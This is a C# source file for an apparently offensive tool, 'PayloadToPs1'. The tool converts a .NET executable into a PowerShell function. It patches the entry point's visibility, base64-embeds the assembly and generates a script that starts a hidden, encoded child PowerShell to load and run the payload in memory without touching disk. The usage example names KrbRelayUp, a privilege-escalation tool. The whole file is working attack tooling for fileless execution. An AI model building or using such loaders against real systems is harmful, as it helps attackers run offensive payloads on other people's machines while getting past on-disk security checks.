
using dnlib.DotNet;
using dnlib.DotNet.Writer;

namespace PayloadToPs1
{
    internal class Program
    {
        private static string _template = """
                                          function %%FUNCTION_NAME%% {
                                              [CmdletBinding()]
                                              Param (
                                                  [String] $Command = ""
                                              )

                                              # <<< put your base64 PE here >>>
                                              [string]$b64 = @"
                                          %%BASE64%%
                                          "@

                                              # Build args for Program::Main
                                              $argsArray = if ([string]::IsNullOrWhiteSpace($Command)) { @() } else { $Command -split '\s+' | Where-Object { $_ } }
                                              $argLits   = ($argsArray | ForEach-Object { "'{0}'" -f ($_.Replace("'", "''")) }) -join ','
                                              $argArray  = if ($argsArray.Count) { "@($argLits)" } else { "@()" }

                                              # Child script: read base64 from STDIN, load assembly in-memory, invoke Main
                                              $childScript = @"
                                          [byte[]]`$b = [Convert]::FromBase64String([Console]::In.ReadToEnd());
                                          [Reflection.Assembly]::Load(`$b) | Out-Null;
                                          [%%FQTN%%]::Main($argArray)
                                          "@

                                              # Encode for -EncodedCommand (Unicode)
                                              $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($childScript))

                                              # Choose pwsh if present, else Windows PowerShell
                                              $psExe = (Get-Command pwsh -ErrorAction SilentlyContinue).Source
                                              if (-not $psExe) { $psExe = (Get-Command powershell -ErrorAction SilentlyContinue).Source }
                                              if (-not $psExe) { throw "No PowerShell executable found (pwsh or powershell)." }

                                              $psi = New-Object System.Diagnostics.ProcessStartInfo
                                              $psi.FileName = $psExe
                                              $psi.Arguments = "-NoProfile -NonInteractive -EncodedCommand $encoded"
                                              $psi.RedirectStandardInput  = $true
                                              $psi.RedirectStandardOutput = $true
                                              $psi.RedirectStandardError  = $true
                                              $psi.UseShellExecute = $false
                                              $psi.CreateNoWindow = $true

                                              $p = [System.Diagnostics.Process]::Start($psi)

                                              # Stream the assembly base64 into STDIN (no disk)
                                              $p.StandardInput.Write($b64)
                                              $p.StandardInput.Close()

                                              $stdout = $p.StandardOutput.ReadToEnd()
                                              $stderr = $p.StandardError.ReadToEnd()
                                              $p.WaitForExit()

                                              if ($stderr) { $stdout + "`n--- STDERR ---`n" + $stderr } else { $stdout }
                                          }
                                          """;

        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.Error.WriteLine("Usage: tool <assembly-path> <function-name>");
                Console.Error.WriteLine("Example: tool KrbRelayUp.exe Invoke-KrbRelayUp");
                return;
            }

            var assemblyPath = args[0];
            var functionName = args[1];
            var template = _template; 
            var outputPath = $"{functionName}.ps1";

            try
            {
                var script = BuildScript(assemblyPath, functionName, template, fixVisibilityIfNeeded: true);
                File.WriteAllText(outputPath, script);
                Console.WriteLine($"{outputPath} written successfully.");
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine($"ERROR: {ex.Message}");
            }
        }
        
        static string BuildScript(
            string assemblyPath,
            string functionName,
            string template,
            bool fixVisibilityIfNeeded = true)
        {
            if (string.IsNullOrWhiteSpace(assemblyPath)) throw new ArgumentNullException(nameof(assemblyPath));
            if (!File.Exists(assemblyPath)) throw new FileNotFoundException("Assembly not found.", assemblyPath);
            if (string.IsNullOrWhiteSpace(functionName)) throw new ArgumentNullException(nameof(functionName));
            if (string.IsNullOrWhiteSpace(template)) throw new ArgumentNullException(nameof(template));

            var asm = AssemblyDef.Load(assemblyPath);
            var info = GetEntrypointInfo(asm);

            // If entrypoint/type aren’t public static, optionally patch in memory
            var payloadBytes = (info.IsTypePublic && info.IsMethodPublicStatic)
                ? File.ReadAllBytes(assemblyPath)
                : (fixVisibilityIfNeeded
                    ? MakePublicStaticAndWriteToBytes(asm, info)
                    : File.ReadAllBytes(assemblyPath));

            var base64 = Convert.ToBase64String(payloadBytes);
            var fqtn = $"{info.Namespace}.{info.TypeName}";

            return template
                .Replace("%%FUNCTION_NAME%%", functionName)
                .Replace("%%FQTN%%", fqtn)
                .Replace("%%BASE64%%", base64);
        }

        private static EntrypointInfo GetEntrypointInfo(AssemblyDef asm)
        {
            var entry = asm.ManifestModule?.EntryPoint
                        ?? throw new InvalidOperationException("No entry point found in assembly.");

            var type = entry.DeclaringType
                       ?? throw new InvalidOperationException("Entry point has no declaring type.");

            return new EntrypointInfo(
                Namespace: type.Namespace?.String ?? string.Empty,
                TypeName: type.Name?.String ?? string.Empty,
                MethodName: entry.Name?.String ?? "Main",
                IsTypePublic: type.IsPublic || type.IsNestedPublic,
                IsMethodPublicStatic: entry.IsPublic && entry.IsStatic,
                EntryPoint: entry,
                DeclaringType: type
            );
        }
        
        private static byte[] MakePublicStaticAndWriteToBytes(AssemblyDef asm, EntrypointInfo info)
        {
            // Make type public (handle nested vs top-level)
            var t = info.DeclaringType;
            t.Attributes &= ~TypeAttributes.VisibilityMask;
            t.Attributes |= TypeAttributes.Public;

            // Make entrypoint Public + Static
            var m = info.EntryPoint;
            m.Attributes &= ~(MethodAttributes.MemberAccessMask | MethodAttributes.Static);
            m.Attributes |= MethodAttributes.Public | MethodAttributes.Static;

            using var ms = new MemoryStream();
            var opts = new ModuleWriterOptions(asm.ManifestModule) { Logger = DummyLogger.NoThrowInstance };
            asm.Write(ms, opts);
            return ms.ToArray();
        }

        private sealed record EntrypointInfo(
            string Namespace,
            string TypeName,
            string MethodName,
            bool IsTypePublic,
            bool IsMethodPublicStatic,
            MethodDef EntryPoint,
            TypeDef DeclaringType);
    }
}
